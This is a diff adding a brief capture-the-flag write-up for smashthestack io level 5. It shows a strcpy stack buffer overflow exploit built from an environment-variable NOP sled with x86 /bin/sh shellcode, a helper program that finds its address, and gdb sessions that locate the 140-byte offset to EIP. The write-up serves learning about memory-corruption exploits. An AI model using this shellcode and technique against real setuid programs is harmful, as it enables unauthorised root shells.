@@ -1,0 +1,105 @@
+source code level 5:
+
+	#include <stdio.h>
+	#include <string.h>
+
+	int main(int argc, char **argv) {
+
+		char buf[128];
+
+		if(argc < 2) return 1;
+
+		strcpy(buf, argv[1]);
+
+		printf("%s\n", buf);	
+
+		return 0;
+	}
+
+strcpy ??? don't check range when copy -->> bufferoverflow
+
+i disscuss environment variable (EV), because i can't check memory address return address (RA)
+
+i create EV, export n=$(python -c 'print "\x90"*10000 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"')
+
+Next, i have to find address of EV by source hihi.c
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	int main(){
+  		printf("%p",getenv("n"));
+		return 0;
+	}
+
+run it -->> address of EV n: 0xbfffd87c
+
+come back source of level 5
+use gdb to deburg:
+first i run $(python -c 'print "A"*140')
+
+	(gdb) run $(python -c 'print "A"*140')
+	Starting program: /levels/level05 $(python -c 'print "A"*140')
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0xb7e3ba00 in __libc_start_main (main=0x80483b4 <main>, argc=2, 
+	    argv=0xbfffd594, init=0x8048470 <__libc_csu_init>, 
+	    fini=0x8048420 <__libc_csu_fini>, rtld_fini=0xb7fedc50 <_dl_fini>, 
+	    stack_end=0xbfffd58c) at libc-start.c:250
+	250	libc-start.c: No such file or directory.
+	(gdb) i r
+	eax            0x0	0
+	ecx            0x0	0
+	edx            0xb7fcc878	-1208170376
+	ebx            0xb7fcb000	-1208176640
+	esp            0xbfffd500	0xbfffd500
+	ebp            0x41414141	0x41414141
+	esi            0x0	0
+	edi            0x0	0
+	eip            0xb7e3ba00	0xb7e3ba00 <__libc_start_main+144>  // note
+	eflags         0x10286	[ PF SF IF RF ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+
+Go on: i run $(python -c 'print "A"*140+ "B"*4')
+
+	run $(python -c 'print "A"*140+ "B"*4')
+	The program being debugged has been started already.
+	Start it from the beginning? (y or n) y
+
+	Starting program: /levels/level05 $(python -c 'print "A"*140+ "B"*4')
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x42424242 in ?? ()
+	(gdb) i r
+	eax            0x0	0
+	ecx            0x0	0
+	edx            0xb7fcc878	-1208170376
+	ebx            0xb7fcb000	-1208176640
+	esp            0xbfffd500	0xbfffd500
+	ebp            0x41414141	0x41414141
+	esi            0x0	0
+	edi            0x0	0
+	eip            0x42424242	0x42424242	// note
+	eflags         0x10286	[ PF SF IF RF ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+
+
+Value eip is overwritened, i replace B by value address of environment address (0xbfffd87c)
+
+http://securitydaily.net/writeup-ctf-io-smashthestack-org-level-05/
+http://www.lopisec.com/2011/12/smashthestack-io-level-5-writing-my.html
+
+
+
+
